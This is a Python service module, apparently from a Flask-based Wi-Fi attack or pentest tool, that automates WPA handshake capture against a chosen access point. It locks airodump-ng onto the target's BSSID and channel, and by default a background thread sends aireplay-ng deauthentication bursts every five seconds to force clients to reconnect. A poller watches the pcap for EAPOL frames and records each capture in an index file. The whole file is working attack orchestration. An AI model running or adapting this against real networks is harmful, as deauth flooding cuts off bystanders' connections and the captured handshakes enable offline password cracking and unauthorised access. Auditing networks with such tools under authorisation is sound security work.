"""Handshake capture service — focused airodump + optional deauth.

Targets a single AP at a time. Operator clicks Capture Handshakes in
the Recon AP slide-out, this service:

1. Resolves the injection radio (``wlan-ap`` by role/name).
2. Sets it to monitor mode and pins it to the target's channel.
3. Launches an airodump-ng locked to ``--bssid <BSSID> --channel <N>``,
   writing a pcap into ``$DATA_DIR/handshakes/<BSSID-fmt>/<ts>-01.cap``.
4. (optional) Spawns a daemon thread that fires aireplay deauth bursts
   at the target every ``deauth_interval`` seconds, defaulting on.
5. Spawns a poller thread that scans the pcap once per second for EAPOL
   M1/M2/M3/M4 frames via ``handshake_detector`` and emits ``capture:status``
   SocketIO events when the M-set changes.

Stop is symmetric: SIGINT the airodump, kill the deauth + poller threads,
read the final pcap one last time, write metadata into the per-handshake
``index.json`` under ``$DATA_DIR/handshakes/``.

Storage layout::

    $DATA_DIR/handshakes/
        AA-BB-CC-DD-EE-01/
            20260605-150012.cap        # raw airodump pcap (one per capture)
        index.json                      # list-of-captures with metadata

The Handshakes top-level page (Session 08) reads ``index.json`` and lists
all captures across all APs. We're not building that page yet — just the
underlying storage so S08 has data to render.

Singleton: same reason ReconService / NetworkingService are singletons —
this stores live JobManager job IDs + active threads on the instance.
"""

from __future__ import annotations

import json
import logging
import signal
import threading
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import Any

from app.services.job_manager import job_manager
from app.tools import airodump, handshake_detector

log = logging.getLogger(__name__)


# ---------- Constants -----------------------------------------------------

POLL_INTERVAL = 1.0           # seconds — capture status poller cadence
DEAUTH_INTERVAL = 5.0         # seconds between deauth bursts when enabled
DEAUTH_COUNT_PER_BURST = 5    # aireplay --deauth N per burst
INJECT_ROLE = "wlan-ap"       # role/name of the injection + focused-capture radio


# ---------- State (per-capture record) ------------------------------------

class _Capture:
    """In-memory state for one in-flight capture. Threads, file paths,
    accumulated status. Persisted to index.json on stop."""

    def __init__(self, bssid: str, channel: int, essid: str,
                 *, deauth: bool, prefix: Path) -> None:
        self.id = uuid.uuid4().hex
        self.bssid = bssid.lower()
        self.channel = channel
        self.essid_at_capture = essid
        self.deauth_used = deauth
        self.prefix = prefix                          # without -01.cap suffix
        self.pcap_path = Path(f"{prefix}-01.cap")     # what airodump will write
        self.started_at = time.time()
        self.ended_at: float | None = None
        self.job_id: str | None = None
        self.iface: str | None = None

        self._stop_event = threading.Event()
        self.deauth_thread: threading.Thread | None = None
        self.poller_thread: threading.Thread | None = None

        self.deauth_count = 0                         # number of bursts fired
        self.last_status: dict[str, Any] = {
            "messages_seen": [],
            "is_complete":   False,
            "is_partial":    False,
            "complete_pairs": 0,
            "partial_pairs":  0,
            "pairs": [],
        }


# ---------- The service ---------------------------------------------------

class HandshakesService:
    def __init__(self, data_dir: Path) -> None:
        self._data_dir = data_dir
        self._dir = data_dir / "handshakes"
        self._index_path = self._dir / "index.json"
        self._lock = threading.Lock()
        # bssid -> _Capture for in-flight captures. One per BSSID, but in
        # practice today only one capture at a time because wlan-ap is
        # shared. Multi-capture would need per-radio scheduling.
        self._active: dict[str, _Capture] = {}

    # ---------- Public API ----------
    def start_capture(
        self, bssid: str, channel: int, essid: str,
        *, deauth: bool = True,
    ) -> tuple[bool, list[str]]:
        """Begin a focused capture. Returns ``(ok, messages)``.

        Idempotent for the same BSSID: if a capture is already running
        for ``bssid``, returns ok with a "already capturing" message.
        Returns failure if no injection iface is available, or another
        capture is currently using the injection radio (concurrent
        captures aren't supported yet).
        """
        bssid_norm = bssid.lower()
        msgs: list[str] = []

        with self._lock:
            if bssid_norm in self._active:
                return True, [f"capture already running for {bssid_norm}"]
            if self._active:
                # Some other BSSID is being captured; injection radio busy
                other = next(iter(self._active.keys()))
                return False, [
                    f"another capture is in flight (target={other}); "
                    f"stop it first before starting a new one"
                ]

        iface = self._resolve_inject_iface()
        if not iface:
            return False, [
                f"no adapter has role/name {INJECT_ROLE!r}. "
                "Configure one via Settings → Adapter Management."
            ]

        # Set up the capture record + per-handshake directory
        per_ap_dir = self._dir / _bssid_fs(bssid_norm)
        try:
            per_ap_dir.mkdir(parents=True, exist_ok=True)
        except OSError as e:
            return False, [f"could not create {per_ap_dir}: {e}"]
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        prefix = per_ap_dir / timestamp

        capture = _Capture(bssid_norm, channel, essid,
                           deauth=deauth, prefix=prefix)
        capture.iface = iface

        # Move the injection iface into monitor mode + pin to channel.
        # Same orchestration as deauth, plus a launch instead of one-shot.
        from app.services.adapters import get_service as get_adapter_service
        from app.tools import iw, nm

        if airodump.is_stub():
            msgs.append(f"(stub) would set {iface} monitor + ch {channel}")
        else:
            ok, msg = nm.set_managed(iface, managed=False)
            msgs.append(f"nm: {msg}")
            if not ok:
                return False, msgs
            ok, mode_msgs = get_adapter_service().set_mode(iface, "monitor")
            msgs += [f"set_mode: {m}" for m in mode_msgs]
            if not ok:
                return False, msgs
            ok, msg = iw.set_channel(iface, int(channel))
            msgs.append(f"channel: {msg}")
            if not ok:
                return False, msgs

        # Wipe any leftover files matching this prefix (shouldn't exist
        # since timestamp is fresh, but be defensive).
        for old in per_ap_dir.glob(f"{prefix.name}-*"):
            try:
                old.unlink()
            except OSError:
                pass

        # Build the focused airodump command. Note --output-format pcap
        # only — we don't need the CSV summary; the EAPOL detector reads
        # the pcap directly.
        cmd = airodump.build_cmd(
            iface, str(prefix),
            channels=str(channel),         # pin channel
            write_interval=1,
        )
        # Inject --bssid to lock to one AP. Insert before the iface
        # (last element of build_cmd's output).
        cmd = cmd[:-1] + ["--bssid", bssid_norm] + [cmd[-1]]

        if airodump.is_stub():
            capture.job_id = f"stub-capture-{int(time.time())}"
            msgs.append(f"(stub) would launch: {' '.join(cmd)}")
        else:
            # /dev/null for stdout — same reason recon does: airodump's
            # stdout is the curses-style refresh table, gigabytes per
            # minute if captured. Useful data is in the pcap.
            job = job_manager.start_job(
                cmd,
                name=f"capture-{bssid_norm[:8]}",
                tags=["handshakes", "capture"],
                stdout_path="/dev/null",
            )
            capture.job_id = job.id
            msgs.append(f"started focused airodump (job {job.id})")

        with self._lock:
            self._active[bssid_norm] = capture

        # Start the status poller thread.
        capture.poller_thread = threading.Thread(
            target=self._poller_loop, args=(capture,),
            daemon=True, name=f"capture-poll-{bssid_norm[:8]}",
        )
        capture.poller_thread.start()

        # Start the deauth burst thread (if enabled). Same ethics line
        # the slide-out's standalone deauth button gates behind — the
        # route handler validates the operator confirmed.
        if deauth:
            capture.deauth_thread = threading.Thread(
                target=self._deauth_loop, args=(capture,),
                daemon=True, name=f"capture-deauth-{bssid_norm[:8]}",
            )
            capture.deauth_thread.start()
            msgs.append(
                f"deauth burst loop active (every {int(DEAUTH_INTERVAL)}s)"
            )
        else:
            msgs.append("passive capture (no deauth)")

        return True, msgs

    def stop_capture(self, bssid: str) -> tuple[bool, list[str]]:
        """Stop the capture for ``bssid``. Idempotent."""
        bssid_norm = bssid.lower()
        with self._lock:
            capture = self._active.get(bssid_norm)
        if capture is None:
            return True, ["no capture running for that BSSID"]

        msgs: list[str] = []
        capture._stop_event.set()
        capture.ended_at = time.time()

        # Stop airodump. SIGINT for the same reason recon does — aircrack
        # tools install a SIGINT handler that flushes the pcap cleanly.
        if capture.job_id and not airodump.is_stub():
            stopped, reason = job_manager.stop_job(
                capture.job_id, grace=5.0, first_signal=signal.SIGINT,
            )
            msgs.append(f"stop airodump (SIGINT): {reason}")

        # Join the threads (best-effort, brief timeout).
        for t in (capture.deauth_thread, capture.poller_thread):
            if t is not None and t.is_alive():
                t.join(timeout=2.0)

        # Final status read so the index entry is accurate.
        if not airodump.is_stub():
            try:
                summary = handshake_detector.summarize_for_capture(
                    capture.pcap_path, capture.bssid,
                )
                capture.last_status = summary
            except Exception:
                log.exception("final pcap parse failed")

        # Persist to index.json
        try:
            self._append_to_index(capture)
            msgs.append(f"persisted to {self._index_path.name}")
        except Exception as e:
            log.exception("index write failed")
            msgs.append(f"index write failed: {e}")

        # Drop from active map
        with self._lock:
            self._active.pop(bssid_norm, None)

        # Final SocketIO emit so the UI updates immediately
        self._emit_capture_status(capture, ended=True)
        return True, msgs

    def get_capture_status(self, bssid: str) -> dict[str, Any] | None:
        """Live status for a running capture. None if not capturing."""
        bssid_norm = bssid.lower()
        with self._lock:
            capture = self._active.get(bssid_norm)
        if capture is None:
            return None
        return self._status_dict(capture)

    def list_captures(self) -> list[dict[str, Any]]:
        """Return all captures from the persisted index (for S08).

        Sort newest-first by started_at.
        """
        if not self._index_path.is_file():
            return []
        try:
            data = json.loads(self._index_path.read_text())
        except (json.JSONDecodeError, OSError) as e:
            log.warning("index.json unreadable: %s", e)
            return []
        captures = data.get("captures") or []
        captures.sort(key=lambda d: d.get("started_at") or 0, reverse=True)
        return captures

    # ---------- Internals ----------
    def _resolve_inject_iface(self) -> str | None:
        """Same role/name lookup recon uses."""
        from app.services.adapters import get_service as get_adapter_service
        adapter_svc = get_adapter_service()
        adapters = adapter_svc.list_adapters()
        roles = adapter_svc.get_roles()
        for mac, role in roles.items():
            if role == INJECT_ROLE:
                for ad in adapters:
                    if ad["mac"] == mac:
                        return ad["name"]
        for ad in adapters:
            if ad["name"] == INJECT_ROLE:
                return ad["name"]
        return None

    def _poller_loop(self, capture: _Capture) -> None:
        """Re-parse the pcap once a second, emit on status change."""
        log.info("capture poller starting for %s", capture.bssid)
        last_emit_key: tuple | None = None
        while not capture._stop_event.is_set():
            try:
                if not airodump.is_stub():
                    summary = handshake_detector.summarize_for_capture(
                        capture.pcap_path, capture.bssid,
                    )
                    capture.last_status = summary
                key = (
                    tuple(capture.last_status.get("messages_seen") or []),
                    capture.last_status.get("complete_pairs", 0),
                    capture.last_status.get("partial_pairs", 0),
                )
                if key != last_emit_key:
                    last_emit_key = key
                    self._emit_capture_status(capture)
            except Exception:
                log.exception("capture poller tick failed")
            capture._stop_event.wait(POLL_INTERVAL)
        log.info("capture poller exiting for %s", capture.bssid)

    def _deauth_loop(self, capture: _Capture) -> None:
        """Fire deauth bursts every DEAUTH_INTERVAL seconds while active."""
        from app.tools import aireplay
        log.info("capture deauth loop starting for %s", capture.bssid)
        # Brief initial pause so airodump is definitely listening before
        # we start kicking clients off.
        capture._stop_event.wait(2.0)
        while not capture._stop_event.is_set():
            if capture.iface is None:
                break
            try:
                ok, msg = aireplay.send_deauth(
                    capture.iface, capture.bssid,
                    client_mac=None, count=DEAUTH_COUNT_PER_BURST,
                )
                if ok:
                    capture.deauth_count += 1
                    log.debug(
                        "capture deauth burst #%d for %s: %s",
                        capture.deauth_count, capture.bssid, msg,
                    )
                else:
                    log.warning("capture deauth failed: %s", msg)
            except Exception:
                log.exception("capture deauth burst threw")
            capture._stop_event.wait(DEAUTH_INTERVAL)
        log.info("capture deauth loop exiting for %s", capture.bssid)

    def _emit_capture_status(self, capture: _Capture, *, ended: bool = False) -> None:
        """Push capture:status over SocketIO."""
        try:
            from app import socketio
            payload = self._status_dict(capture)
            payload["ended"] = ended
            socketio.emit("capture:status", payload, namespace="/")
        except Exception:
            log.exception("capture status emit failed")

    def _status_dict(self, capture: _Capture) -> dict[str, Any]:
        return {
            "id":               capture.id,
            "bssid":            capture.bssid,
            "essid":            capture.essid_at_capture,
            "channel":          capture.channel,
            "iface":            capture.iface,
            "deauth_used":      capture.deauth_used,
            "deauth_count":     capture.deauth_count,
            "started_at":       capture.started_at,
            "ended_at":         capture.ended_at,
            "pcap_path":        str(capture.pcap_path),
            "status":           dict(capture.last_status),
        }

    def _append_to_index(self, capture: _Capture) -> None:
        """Add the finished capture to index.json. Creates file if absent."""
        try:
            data = json.loads(self._index_path.read_text())
            if not isinstance(data, dict) or "captures" not in data:
                data = {"captures": []}
        except (FileNotFoundError, json.JSONDecodeError):
            data = {"captures": []}

        # Compact summary for the index — full pair detail re-parsed on
        # demand in S08 if needed.
        entry = {
            "id":                capture.id,
            "bssid":             capture.bssid,
            "essid_at_capture":  capture.essid_at_capture,
            "channel_at_capture": capture.channel,
            "started_at":        capture.started_at,
            "ended_at":          capture.ended_at,
            "duration_secs":     int((capture.ended_at or time.time())
                                     - capture.started_at),
            "deauth_used":       capture.deauth_used,
            "deauth_count":      capture.deauth_count,
            "pcap_relative_path": str(capture.pcap_path.relative_to(self._dir)),
            "messages_seen":     list(capture.last_status.get("messages_seen") or []),
            "is_complete":       bool(capture.last_status.get("is_complete")),
            "is_partial":        bool(capture.last_status.get("is_partial")),
            "complete_pairs":    int(capture.last_status.get("complete_pairs") or 0),
            "partial_pairs":     int(capture.last_status.get("partial_pairs") or 0),
        }
        data["captures"].append(entry)
        self._index_path.parent.mkdir(parents=True, exist_ok=True)
        tmp = self._index_path.with_suffix(".tmp")
        tmp.write_text(json.dumps(data, indent=2))
        tmp.replace(self._index_path)


# ---------- Helpers -------------------------------------------------------

def _bssid_fs(bssid: str) -> str:
    """Turn ``aa:bb:cc:dd:ee:ff`` into ``AA-BB-CC-DD-EE-FF`` for fs use."""
    return bssid.upper().replace(":", "-")


# ---------- Module singleton ----------------------------------------------

_service: "HandshakesService | None" = None


def get_service() -> HandshakesService:
    global _service
    if _service is None:
        from flask import current_app
        _service = HandshakesService(current_app.config["DATA_DIR"])
    return _service
